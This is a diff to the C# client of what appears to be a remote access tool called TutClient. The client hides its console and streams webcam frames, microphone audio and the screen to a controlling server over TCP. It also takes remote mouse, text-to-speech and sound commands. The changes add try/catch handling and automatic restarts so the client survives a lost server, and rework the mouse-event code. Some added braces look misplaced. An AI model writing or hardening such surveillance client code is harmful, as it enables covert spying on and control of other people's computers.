@@ -33,8 +33,8 @@ namespace TutClient
         public static extern int GetDesktopWindow();
         [DllImport("Kernel32")]
         private static extern bool SetConsoleCtrlHandler(EventHandler handler, bool add);
-        [DllImport("user32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
-        public static extern void mouse_event(uint dwFlags, int dx, int dy, uint cButtons, uint dwExtraInfo);
+        [DllImport("user32.dll")]
+        static extern void mouse_event(int dwFlags, int dx, int dy, int dwData, int dwExtraInfo); //pinvoke
 
         private delegate bool EventHandler(CtrlType sig);
         static EventHandler _handler;
@@ -83,14 +83,24 @@ namespace TutClient
                     return false;
             }
         }
+           [Flags] //mouse movement 
+        public enum MouseEventFlags
+        {
+            LEFTDOWN = 0x00000002,
+            LEFTUP = 0x00000004,
+            MIDDLEDOWN = 0x00000020,
+            MIDDLEUP = 0x00000040,
+            MOVE = 0x00000001,
+            ABSOLUTE = 0x00008000,
+            RIGHTDOWN = 0x00000008,
+            RIGHTUP = 0x00000010
+
+
+        }
 
         private const int SW_HIDE = 0;
         private const int SW_SHOW = 1;
-        private const int MOUSEEVENTF_LEFTDOWN = 0x02;
-        private const int MOUSEEVENTF_LEFTUP = 0x04;
-        private const int MOUSEEVENTF_RIGHTDOWN = 0x08;
-        private const int MOUSEEVENTF_RIGHTUP = 0x10;
-
+      
         private static Socket _clientSocket = new Socket
             (AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
 
@@ -235,6 +245,10 @@ namespace TutClient
         {
 
             var buffer = new byte[2048];
+            
+            try //added a try catch ,if the server shutdown or disconnected rapidly this would crash
+            {
+                
             int received = _clientSocket.Receive(buffer, SocketFlags.None);
             if (received == 0) return;
             var data = new byte[received];
@@ -322,7 +336,7 @@ namespace TutClient
                     sound.Play();
                 }
 
-                if (text.StartsWith("ts2|"))
+                if (text.StartsWith("t2s|")) //changed spelling mistake here it was ts2
                 {
                     String txt = text.Split('|')[1];
                     t2s(txt);
@@ -1072,9 +1086,19 @@ namespace TutClient
                 }
             }
         }
+            catch (Exception ex)
+             {
+                //added this try catch after it crashed when server closed without sending disconnect
+                Console.WriteLine(ex.Message);  
+                RDesktop.isShutdown = true;
+                 Console.WriteLine("Connection Ended");
+            }
 
         private static void source_NewFrame(object sender, NewFrameEventArgs e)
         {
+             try //added a try catch as tcp puts this into a loop if server shutsdown rapidly and crashes
+            {
+                 
             System.Drawing.Bitmap cam = (System.Drawing.Bitmap)e.Frame.Clone();
 
             System.Drawing.ImageConverter convert = new System.Drawing.ImageConverter();
@@ -1088,6 +1112,27 @@ namespace TutClient
             Application.DoEvents();
             Thread.Sleep(500);
             cam.Dispose();
+             }
+             catch
+            {
+                try//try to disconnect if connection lost during send otherwise critical error
+                {
+                    Console.WriteLine("Connection Ended");
+                    Thread.Sleep(3000); 
+                    isDisconnect = true;
+                  
+                }
+                   
+                catch (Exception exc)//we should never get here but incase we do restart the application
+                {
+                  
+                    Console.WriteLine("Failed to send New Frame  original ERROR : " + exc.Message);
+                    Thread.Sleep(10000);
+                    Application.Restart();
+                    return;
+                }
+
+            }
         }
 
         private static void sendAudio(object sender, NAudio.Wave.WaveInEventArgs e)
@@ -1104,6 +1149,8 @@ namespace TutClient
 
         public static void SendScreen(byte[] img)
         {
+            try //added a try catch as tcp puts this into a loop if server shutsdown rapidly and crashes
+            {
             Console.WriteLine("Size of the image: " + img.Length);
             byte[] send = new byte[img.Length + 16];
             byte[] header = Encoding.Unicode.GetBytes("rdstream");
@@ -1111,8 +1158,29 @@ namespace TutClient
             Buffer.BlockCopy(img, 0, send, header.Length, img.Length);
             Console.WriteLine("Size of send: " + send.Length);
             _clientSocket.Send(send, 0, send.Length, SocketFlags.None);
-        }
+            }
+              catch 
+            {
+                try
+                {
+                    Console.WriteLine("Connection Ended"); //try to disconnect if connection lost during send otherwise critical error
+                    Thread.Sleep(3000); 
+                    isDisconnect = true;
+                   
+                }
+                   catch (Exception e) //we should never get here but incase we do restart the application
+                {
+                  
+                    Console.WriteLine("Failed To send Screen  original ERROR : " + e.Message);
+                    Thread.Sleep(10000);
+                    Application.Restart();
 
+                }
+            }
+                
+            
+        }
+         //changed this as it is more reliable method to capture mouse movements
         private static void MouseEvent(string button, string direction)
         {
             int X = Cursor.Position.X;
@@ -1123,13 +1191,13 @@ namespace TutClient
                 case "left":
                     if (direction == "up")
                     {
-                        mouse_event(MOUSEEVENTF_LEFTUP, X, Y, 0, 0);
+                         mouse_eventLeftUP(MouseEventFlags.LEFTUP, X, Y, 0, 0);
                         Console.WriteLine("mouseevent leftup");
                     }
 
                     else
                     {
-                        mouse_event(MOUSEEVENTF_LEFTDOWN, X, Y, 0, 0);
+                       mouse_eventLefteDown(MouseEventFlags.LEFTDOWN, X, Y, 0, 0);
                         Console.WriteLine("mouseevent leftdown");
                     }
 
@@ -1138,19 +1206,48 @@ namespace TutClient
                 case "right":
                     if (direction == "up")
                     {
-                        mouse_event(MOUSEEVENTF_RIGHTUP, X, Y, 0, 0);
+                        mouse_eventRightUP(MouseEventFlags.RIGHTUP, X, Y, 0, 0);
                         Console.WriteLine("mouseevent rightup");
                     }
 
                     else
                     {
-                        mouse_event(MOUSEEVENTF_RIGHTDOWN, X, Y, 0, 0);
+                        mouse_eventRightDown(MouseEventFlags.RIGHTDOWN, X, Y, 0, 0);
                         Console.WriteLine("mouseevent rightdown");
                     }
 
                     break;
             }
         }
+            //added these methods to capture the mouse movement , its more reliable this way
+              private static void mouse_eventLeftUP(MouseEventFlags lEFTUP, int x, int y, int v1, int v2)
+        {
+           
+            Cursor.Position = new Point(x, y);    
+            mouse_event((int)(MouseEventFlags.LEFTUP), 0, 0, 0, 0);
+          
+        }
+        private static void mouse_eventLefteDown(MouseEventFlags lEFTUP, int x, int y, int v1, int v2)
+        {
+          
+            Cursor.Position = new Point(x, y);
+            mouse_event((int)(MouseEventFlags.LEFTDOWN), 0, 0, 0, 0);
+         
+        }
+        private static void mouse_eventRightUP(MouseEventFlags lEFTUP, int x, int y, int v1, int v2)
+        {
+         
+            Cursor.Position = new Point(x, y);
+            mouse_event((int)(MouseEventFlags.RIGHTUP), 0, 0, 0, 0);
+        }
+        private static void mouse_eventRightDown(MouseEventFlags lEFTUP, int x, int y, int v1, int v2)
+        {
+         
+            Cursor.Position = new Point(x, y);
+            mouse_event((int)(MouseEventFlags.RIGHTDOWN), 0, 0, 0, 0);
+        
+        }
+
 
         private static void DirectoryCopy(string sourceDirName, string destDirName, bool copySubDirs)
         {
